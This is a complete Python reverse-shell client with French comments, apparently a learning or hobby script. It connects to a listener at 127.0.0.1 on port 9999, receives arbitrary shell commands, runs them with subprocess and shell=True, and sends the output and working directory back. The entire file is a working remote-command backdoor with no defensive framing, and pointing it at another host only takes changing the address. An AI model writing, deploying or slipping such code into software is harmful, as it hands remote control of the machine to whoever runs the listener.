import os
import socket
import subprocess

# Création du socket
def create_socket():
    try:
        global host
        global port
        global sock
        host = '127.0.0.1'
        port = 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Error during the creation of the socket ... " + str(msg))

# Connexion au serveur
def socket_connection():
    try:
        global host
        global port
        global sock
        sock.connect((host, port))
    except socket.error as msg:
        print("Error with the conection to the socket ... " + str(msg))
# Fonction pour recevoir des commandes
def recv_cmd():
    global sock
    while True:
        data = sock.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            sock.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    sock.close()

def main():
    create_socket()
    socket_connection()
    recv_cmd()

main()
